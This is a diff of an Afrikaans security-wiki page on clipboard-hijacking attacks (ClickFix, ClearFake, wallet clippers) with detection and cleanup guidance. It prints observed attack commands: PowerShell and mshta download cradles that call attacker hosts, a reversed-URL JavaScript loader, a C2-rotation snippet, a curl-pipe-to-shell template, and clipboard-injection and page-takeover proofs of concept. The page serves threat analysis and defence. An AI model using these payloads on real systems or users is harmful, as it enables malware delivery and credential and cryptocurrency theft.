@@ -1,32 +1,30 @@
 # Clipboard Hijacking (Pastejacking)-aanvalle
 
-{{#include ../../banners/hacktricks-training.md}}
-
 > "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies
 
 ## Oorsig
 
-Clipboard hijacking – ook bekend as *pastejacking* – buit die feit uit dat gebruikers gereeld opdragte copy-and-paste sonder om dit te inspekteer. ’n Kwaadwillige webblad (of enige JavaScript-capable konteks soos ’n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die system clipboard. Slagoffers word gewoonlik deur sorgvuldig saamgestelde social-engineering-instruksies aangemoedig om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminal oop te maak en die clipboard-inhoud te *paste*, wat onmiddellik arbitrêre opdragte uitvoer.
+Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit te inspekteer. 'n Kwaadwillige webblad (of enige JavaScript-capable konteks soos 'n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die stelsel se clipboard. Slagoffers word gewoonlik deur noukeurig saamgestelde social-engineering-instruksies aangemoedig om **Win + R** (Run-dialoog), **Win + X** (Quick Access / PowerShell) te druk, of 'n terminaal oop te maak en die clipboard-inhoud te *plak*, wat arbitrêre opdragte onmiddellik uitvoer.
 
-Omdat **geen lêer afgelaai word en geen attachment oopgemaak word nie**, omseil die tegniek die meeste e-mail- en web-content-sekuriteitskontroles wat attachments, macros of direkte command execution monitor. Die aanval is daarom gewild in phishing campaigns wat commodity malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.<sup>[[1]](#references)</sup>
+Omdat **geen lêer afgelaai en geen attachment oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitskontroles wat attachments, macros of direkte uitvoering van opdragte monitor. Die aanval is dus gewild in phishing campaigns wat commodity malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.<sup>[[1]](#references)</sup>
 
-## Wallet-address replacement clippers
+## Wallet-adresvervangings-clippers
 
-Nog ’n **clipboard hijacking**-variant paste glad nie opdragte nie: dit wag totdat die slagoffer ’n **cryptocurrency wallet address** kopieer en vervang dit dan stilweg met een wat deur die aanvaller beheer word, net voordat dit geplak word. Dit is veral effektief teen lang wallet-formate omdat gebruikers dikwels slegs die eerste/laaste karakters verifieer.<sup>[[8]](#references)</sup>
+'n Ander **clipboard hijacking**-variant plak glad nie opdragte nie: dit wag totdat die slagoffer 'n **cryptocurrency wallet-adres** kopieer, en vervang dit dan stilweg met een wat deur die aanvaller beheer word net voor dit geplak word. Dit is veral effektief teen lang wallet-formate omdat gebruikers dikwels slegs die eerste/laaste karakters verifieer.<sup>[[8]](#references)</sup>
 
 Algemene eienskappe in die werklike wêreld:
-- **Thin loader + nested payload**: die sigbare app/exe lyk soos ’n wettige trading- of "profit"-tool, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld ’n .NET loader wat ’n nested Rust payload launch).
-- **Regex-driven replacement**: die malware match strings soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-character Solana-like** strings en herskryf dit na attacker wallets.
-- **Wallet rotation at scale**: moderne Windows-samples kan **duisende** replacement wallets per currency embed in plaas van ’n enkele statiese address, wat wallet reputation burn ná elke theft verminder.<sup>[[8]](#references)</sup>
+- **Thin loader + nested payload**: die sigbare app/exe lyk soos 'n wettige trading- of "profit"-tool, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld 'n .NET loader wat 'n nested Rust payload begin).
+- **Regex-driven replacement**: die malware pas strings soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-character Solana-like** strings by en herskryf dit na attacker wallets.
+- **Wallet rotation at scale**: moderne Windows-samples kan **duisende** replacement wallets per currency insluit in plaas van 'n enkele statiese adres, wat wallet reputation burn ná elke diefstal verminder.<sup>[[8]](#references)</sup>
 
-### Windows clipper flow
+### Windows clipper-vloei
 
-’n Algemene implementering is ’n hidden window wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard update call die malware tipies:<sup>[[8]](#references)</sup>
-- **`OpenClipboard`** → kry toegang tot die huidige clipboard data.
+'n Algemene implementering is 'n hidden window wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard update roep die malware tipies die volgende aan:<sup>[[8]](#references)</sup>
+- **`OpenClipboard`** → kry toegang tot huidige clipboard-data.
 - **`GetClipboardData`** → lees teks.
-- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet string met die attacker value.
+- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet-string met die attacker value.
 
-Minimal hunting regexes wat gereeld in clippers voorkom:
+Minimal hunting regexes wat gereeld in clippers gesien word:
 ```regex
 \b(bc1)[A-Za-z0-9]{26,45}\b
 \b(1)[A-Za-z0-9]{26,35}\b
@@ -35,40 +33,40 @@ Minimal hunting regexes wat gereeld in clippers voorkom:
 \b(addr1)[A-Za-z0-9]{26,108}\b
 \b[A-Za-z0-9]{44}\b
 ```
-Gebruikersvlak-persistentie is voldoende vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
+User-vlak persistence is voldoende vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
 - Kopieer payload na **`%APPDATA%\silke\silke.exe`**
 - Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
 
 Opsporingsidees:
-- Prosesse wat clipboard-API’s voortdurend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
-- Nuwe LNK-/executable-skepping, gevolg deur herskrywings van wallet-addresses in die clipboard.
-- Archives of fake-software-bundels wat baie ongebruikte lêers bevat, plus ’n klein launcher wat ’n geneste binary start.
+- Prosesse wat clipboard APIs voortdurend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
+- Nuwe LNK/uitvoerbare-lêer-skepping gevolg deur herskrywings van wallet-address clipboard-inhoud.
+- Argiewe of vals-software-bundels wat baie ongebruikte lêers bevat, plus ’n klein launcher wat ’n geneste binary begin.
 
 ### macOS social-engineered quarantine removal + LaunchAgent persistence
 
-Op macOS versprei sommige veldtogte ’n **`unlocker.command`**-helper en gee die slagoffer opdrag om regs te klik → **Open** indien Gatekeeper sê dat die app beskadig is of van ’n onbekende developer afkomstig is. Die script verwyder bloot quarantine en launch die nabygeleë `.app`:<sup>[[8]](#references)</sup>
+Op macOS versprei sommige veldtogte ’n **`unlocker.command`**-helper en instrueer die slagoffer om regs te klik → **Open** as Gatekeeper sê dat die app beskadig is of van ’n onbekende ontwikkelaar afkomstig is. Die script verwyder bloot quarantine en launch die nabygeleë `.app`:<sup>[[8]](#references)</sup>
 ```bash
 /usr/bin/xattr -cr "$chosen"
 /usr/bin/open "$chosen"
 ```
-This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** wat die feit misbruik dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>
+Dit is **nie ’n Gatekeeper-exploit nie; dit is ’n **sosiaal-gemanipuleerde kwarantyn-omseiling** wat misbruik maak van die feit dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>
 
-Na uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
-- **`~/launch.sh`** – wrapper script
+Ná uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
+- **`~/launch.sh`** – wrapper-skrip
 - **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`
 
-'n Nuttige defensiewe detail is dat sommige samples 'n **self-healing watchdog** implementeer wat die LaunchAgent en wrapper elke ~30 sekondes herskryf. As jy die plist eerste verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimingsvolgorde:
-1. Kill die aktiewe clipper-proses.
-2. Unload/delete die LaunchAgent plist.
-3. Delete `~/launch.sh` en die gekopieerde payload.
+’n Nuttige defensiewe detail is dat sommige samples ’n **selfherstellende watchdog** implementeer wat die LaunchAgent en wrapper ongeveer elke 30 sekondes herskryf. As jy die plist eerste verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimingsvolgorde:
+1. Beëindig die aktiewe clipper-proses.
+2. Unload/verwyder die LaunchAgent-plist.
+3. Verwyder `~/launch.sh` en die gekopieerde payload.
 
-### Delivery note: fake reputation as a force multiplier
+### Afleweringsnota: vals reputasie as ’n kragvermenigvuldiger
 
-Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **distribution layer** die swaar werk doen: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views en onskadelik lykende VirusTotal comments/votes word gebruik om die binary betroubaar te laat voorkom voordat dit uitgevoer word.<sup>[[8]](#references)</sup>
+Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **verspreidingslaag** die swaar werk doen: vals GitHub-stars/forks, SourceForge-resensies/aflaaie, YouTube-tutoriaalopmerkings/-kyke, en onskuldig lykende VirusTotal-opmerkings/stemme word gebruik om die binary betroubaar te laat voorkom vóór uitvoering.<sup>[[8]](#references)</sup>
 
-## Forced copy buttons and hidden payloads (macOS one-liners)
+## Geforseerde kopieerknoppies en versteekte payloads (macOS one-liners)
 
-Sommige macOS-infostealers kloon installer-webwerwe (byvoorbeeld Homebrew) en **force use of a “Copy” button** sodat gebruikers nie net die sigbare teks kan highlight nie. Die clipboard-inskrywing bevat die verwagte installer command plus 'n aangehegte Base64-payload (byvoorbeeld `...; echo <b64> | base64 -d | sh`), sodat een paste albei uitvoer terwyl die UI die ekstra stage versteek.<sup>[[5]](#references)</sup>
+Sommige macOS-infostealers kloon installer-webwerwe (byvoorbeeld Homebrew) en **dwing die gebruik van ’n “Copy”-knoppie af** sodat gebruikers nie net die sigbare teks kan selekteer nie. Die clipboard-inskrywing bevat die verwagte installer-opdrag plus ’n aangehegte Base64-payload (byvoorbeeld `...; echo <b64> | base64 -d | sh`), sodat een enkele plakaksie albei uitvoer terwyl die UI die ekstra stadium versteek.<sup>[[5]](#references)</sup>
 
 ## JavaScript Proof-of-Concept
 ```html
@@ -82,17 +80,17 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwes steun op die asinchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>
+Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwer veldtogte maak staat op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>
 
 ## Die ClickFix / ClearFake-vloei
 
-1. Gebruiker besoek ’n typosquatted- of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
-2. Ingespuitte **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-geënkodeerde PowerShell one-liner in die clipboard stoor.
-3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die command en druk Enter om die probleem op te los.”*
-4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n legitieme executable plus ’n malicious DLL bevat (klassieke DLL sideloading).
-5. Die loader dekripteer addisionele stages, inject shellcode en installeer persistence (bv. scheduled task) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer uitvoer.<sup>[[1]](#references)</sup>
+1. Gebruiker besoek ’n webwerf met ’n nagebootste domeinnaam of ’n gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
+2. Ingevoegde **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-geënkodeerde PowerShell-eenreëlopdrag in die knipbord stoor.
+3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
+4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n wettige uitvoerbare lêer plus ’n kwaadwillige DLL bevat (klassieke DLL sideloading).
+5. Die laaier dekripteer bykomende fases, injecteer shellcode en installeer persistence (bv. scheduled task) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer uitvoer.<sup>[[1]](#references)</sup>
 
-### Voorbeeld van NetSupport RAT Chain
+### Voorbeeld van ’n NetSupport RAT-ketting
 ```powershell
 powershell -nop -w hidden -enc <Base64>
 # ↓ Decodes to:
@@ -100,8 +98,8 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (wettige Java WebStart) soek in sy gids vir `msvcp140.dll`.
-* Die kwaadwillige DLL resolve API's dinamies met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met 'n rolling XOR key `"https://google.com/"`, injecteer die finale shellcode en unzip **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>
+* `jp2launcher.exe` (legitimate Java WebStart) soek sy gids vir `msvcp140.dll`.
+* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met behulp van 'n rollende XOR-sleutel `"https://google.com/"`, injecteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>
 
 ### Latrodectus Loader
 ```
@@ -109,23 +107,23 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. Laai `la.txt` af met **curl.exe**
 2. Voer die JScript downloader binne **cscript.exe** uit
-3. Haal ’n MSI payload op → plaas `libcef.dll` langs ’n signed application → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>
+3. Haal ’n MSI payload op → plaas `libcef.dll` langs ’n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>
 
 ### Lumma Stealer via MSHTA
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-Die **mshta**-oproep loods ’n versteekte PowerShell-script wat `PartyContinued.exe` verkry, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` deur middel van `extrac32` en lêersamevoeging rekonstrueer, en uiteindelik ’n `.a3x`-script uitvoer wat blaaier-aanmeldbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>
+Die **mshta**-oproep loods ’n versteekte PowerShell-script wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` deur middel van `extrac32` en lêersamevoeging rekonstrueer, en uiteindelik ’n `.a3x`-script uitvoer wat blaaierbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>
 
-## ClickFix: Knipbord → PowerShell → JS eval → Startup LNK met roterende C2 (PureHVNC)
+## ClickFix: Klembord → PowerShell → JS eval → Opstart-LNK met roterende C2 (PureHVNC)
 
-Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers die opdrag om ’n one-liner te plak wat JavaScript via WSH haal en uitvoer, dit volhardend maak en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>
+Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers opdrag om ’n one-liner te plak wat JavaScript via WSH ophaal en uitvoer, dit volhardend maak en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>
 ```powershell
 powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
 ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
 ```
 Sleutelkenmerke
-- Verdoeselde URL word tydens looptyd omgekeer om oppervlakkige inspeksie te omseil.
+- Obfuscated URL word tydens looptyd omgedraai om toevallige inspeksie te omseil.
 - JavaScript behou homself via ’n Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.<sup>[[3]](#references)</sup>
 
 Minimale JS-fragment wat gebruik word om C2’s volgens datum te roteer:<sup>[[3]](#references)</sup>
@@ -140,37 +138,37 @@ return 'https://'
 + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
 }
 ```
-Next stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels deur TLS aan ’n hardcoded sertifikaat te koppel en verkeer in chunks op te deel.<sup>[[3]](#references)</sup>
+Die volgende stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels deur TLS aan ’n hardgekodeerde sertifikaat te pin en verkeer in stukke op te deel.<sup>[[3]](#references)</sup>
 
-Detection-idees spesifiek vir hierdie variant
-- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
-- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript met ’n JS-path onder `%TEMP%`/`%APPDATA%` uitvoer.
-- Registry/RunMRU- en command-line-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
+Opsporingsidees spesifiek vir hierdie variant
+- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
+- Opstartartefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript met ’n JS-pad onder `%TEMP%`/`%APPDATA%` aanroep.
+- Register/RunMRU en command-line-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
 - Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang scripts te voer sonder lang command lines.
-- Scheduled Tasks wat daarna LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n updater-agtige task/path (bv. `\GoogleSystem\GoogleUpdater`).
+- Scheduled Tasks wat daarna LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n updater-agtige taak/pad (bv. `\GoogleSystem\GoogleUpdater`).
 
 Threat hunting
-- C2-hostname en URL’s wat daagliks roteer, met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
-- Korrelleer clipboard write-events wat gevolg word deur Win+R paste en daarna onmiddellike `powershell.exe`-execution.
+- Daagliks roterende C2-hostname en URLs met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
+- Korreleer clipboard-skryfgebeurtenisse wat gevolg word deur Win+R-plak en daarna onmiddellike `powershell.exe`-uitvoering.
 
-Blue-teams kan clipboard-, process-creation- en registry-telemetrie kombineer om pastejacking-misbruik te identifiseer:
+Blue teams kan clipboard-, proses-skepping- en registertelemetrie kombineer om pastejacking-misbruik te identifiseer:
 
-* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-commands by – soek ongewone Base64 / obfuscated entries.
+* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-commands – soek na ongewone Base64-/obfuscated-inskrywings.
 * Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } is.
-* Event ID **4663** vir file creations onder `%LocalAppData%\Microsoft\Windows\WinX\` of temporary folders net voor die verdagte 4688-event.
-* EDR clipboard sensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik deur ’n nuwe PowerShell-process gevolg word.
+* Event ID **4663** vir lêerskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688-gebeurtenis.
+* EDR-clipboard-sensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik gevolg word deur ’n nuwe PowerShell-proses.
 
-## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads
+## IUAM-styl-verifikasiebladsye (ClickFix Generator): clipboard-kopiëring-na-console + OS-bewuste payloads
 
-Onlangse campaigns produseer groot hoeveelhede vals CDN/browser-verification pages ("Just a moment…", IUAM-style) wat gebruikers dwing om OS-spesifieke commands vanaf hul clipboard na native consoles te kopieer. Dit verskuif execution uit die browser-sandbox en werk oor Windows en macOS heen.<sup>[[4]](#references)</sup>
+Onlangse veldtogte vervaardig op groot skaal vals CDN-/browser-verifikasiebladsye ("Just a moment…", IUAM-styl) wat gebruikers dwing om OS-spesifieke commands vanaf hul clipboard na native consoles te kopieer. Dit verskuif uitvoering uit die browser-sandbox en werk op Windows en macOS.<sup>[[4]](#references)</sup>
 
-Belangrikste eienskappe van die builder-generated pages
-- OS-detection via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele decoys/no-ops vir unsupported OS’e om die illusie te behou.
-- Automatic clipboard-copy tydens onskadelike UI-actions (checkbox/Copy), terwyl die sigbare teks van die clipboard-inhoud kan verskil.
-- Mobile blocking en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
-- Opsionele obfuscation en single-file injector om ’n compromised site se DOM met ’n Tailwind-styled verification UI te oorskryf (geen nuwe domain registration nodig nie).<sup>[[4]](#references)</sup>
+Belangrikste kenmerke van die builder-gegenereerde bladsye
+- OS-detectie via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele decoys/no-ops vir onondersteunde OS’e om die illusie te handhaaf.
+- Outomatiese clipboard-kopiëring tydens benigne UI-aksies (checkbox/Copy), terwyl die sigbare teks van die clipboard-inhoud kan verskil.
+- Mobiele blokkering en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
+- Opsionele obfuscation en ’n single-file injector om ’n gekompromitteerde webwerf se DOM met ’n Tailwind-gestileerde verifikasie-UI te oorskryf (geen nuwe domeinregistrasie benodig nie).<sup>[[4]](#references)</sup>
 
-Example: clipboard mismatch + OS-aware branching
+Voorbeeld: clipboard-mismatch + OS-bewuste branching
 ```html
 <div class="space-y-2">
 <label class="inline-flex items-center space-x-2">
@@ -198,9 +196,9 @@ document.getElementById('chk').addEventListener('click', copyReal);
 </script>
 ```
 macOS-volharding van die aanvanklike uitvoering
-- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminaal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>
+- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>
 
-Oorneem van bladsye op gekompromitteerde werwe in plek
+In-place-bladsy-oorneming op gekompromitteerde webwerwe
 ```html
 <script>
 (async () => {
@@ -212,11 +210,11 @@ document.head.appendChild(s);
 })();
 </script>
 ```
-Opsporings- en hunting-idees spesifiek vir IUAM-styl-lokmiddels
-- Web: Bladsye wat die Clipboard API aan verification widgets bind; wanpassing tussen vertoonde teks en clipboard payload; `navigator.userAgent`-vertakking; Tailwind + single-page replace in verdagte kontekste.
-- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch/MSI installers wat vanaf `%TEMP%` uitgevoer word.
-- macOS endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` naby blaaiergebeure voortbring; agtergrondtake wat voortgaan nadat die terminaal gesluit is.
-- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende skepping van console-prosesse.
+Opsporings- en hunting-idees spesifiek vir IUAM-styl lures
+- Web: Bladsye wat die Clipboard API aan verifikasie-widgets bind; wanpassing tussen die vertoonde teks en die clipboard-payload; `navigator.userAgent`-vertakking; Tailwind + single-page-vervanging in verdagte kontekste.
+- Windows-eindpunt: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch/MSI-installers wat vanuit `%TEMP%` uitgevoer word.
+- macOS-eindpunt: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` naby blaaiergebeure spawn; agtergrondtake wat voortbestaan nadat die terminale gesluit is.
+- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende konsole-prosesskepping.
 
 Sien ook vir ondersteunende tegnieke
 
@@ -230,46 +228,46 @@ homograph-attacks.md
 
 ## 2026 fake CAPTCHA / ClickFix-evolusies (ClearFake, Scarlet Goldfinch)
 
-- ClearFake gaan voort om WordPress-webwerwe te kompromitteer en loader JavaScript in te spuit wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) aanmekaar skakel, asook blockchain-“etherhiding”-calls (bv. POSTs na Binance Smart Chain API-endpoints soos `bsc-testnet.drpc[.]org`) om huidige lure logic te haal. Onlangse overlays gebruik sterk fake CAPTCHAs wat gebruikers opdrag gee om ’n one-liner (T1204.004) te copy/paste in plaas daarvan om enigiets af te laai.<sup>[[6]](#references)</sup>
-- Initial execution word toenemend aan signed script hosts/LOLBAS gedelegeer. Januarie 2026-kettings het vroeëre `mshta`-gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige arguments met aliases/wildcards deurgee om remote content te haal:<sup>[[6]](#references)</sup>
+- ClearFake gaan voort om WordPress-webwerwe te kompromitteer en loader JavaScript in te spuit wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) aanmekaar skakel, asook blockchain-“etherhiding”-oproepe (byvoorbeeld POSTs na Binance Smart Chain API-eindpunte soos `bsc-testnet.drpc[.]org`) om huidige lure-logika op te haal. Onlangse overlays gebruik sterk fake CAPTCHAs wat gebruikers opdrag gee om ’n eenreël-opdrag (T1204.004) te copy/paste eerder as om enigiets af te laai.<sup>[[6]](#references)</sup>
+- Aanvanklike uitvoering word toenemend aan signed script hosts/LOLBAS gedelegeer. Januarie 2026-kettings het vroeëre `mshta`-gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige argumente met aliases/wildcards deurgee om afgeleë inhoud te haal:<sup>[[6]](#references)</sup>
 ```cmd
 "C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
 ```
-- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; tesame met `WScript.exe` en ongewone argumente (`gal`/`gcm`-aliasse, cmdlets met jokertekens, jsDelivr-URL's) word dit ’n hoësein-LOLBAS-fase vir ClearFake.<sup>[[6]](#references)</sup>
-- Vals CAPTCHA-payloads het in Februarie 2026 teruggeskuif na suiwer PowerShell-download-cradles. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>
+- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; saam met `WScript.exe` en ongewone argumente (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit ’n hoë-sein LOLBAS-stadium vir ClearFake.<sup>[[6]](#references)</sup>
+- Vervalste CAPTCHA-payloads van Februarie 2026 het teruggeskuif na suiwer PowerShell download cradles. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>
 ```powershell
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
 ```
-- Die eerste chain is ’n in-memory `iex(irm ...)` grabber; die tweede stageer via `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en lanseer dit met `-ep bypass` in ’n versteekte venster.<sup>[[6]](#references)</sup>
+- Die eerste ketting is ’n in-geheue `iex(irm ...)` grabber; die tweede een gebruik `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en begin dit dan met `-ep bypass` in ’n versteekte venster.<sup>[[6]](#references)</sup>
 
 Opsporings-/hunting-wenke vir hierdie variante
-- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná clipboard-skrywings/Win+R.
-- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domains, of rou IP `iex(irm ...)`-patrone.
-- Network: uitgaande verbinding na CDN worker-hosts of blockchain RPC-endpoints vanaf script hosts/PowerShell kort ná web browsing.
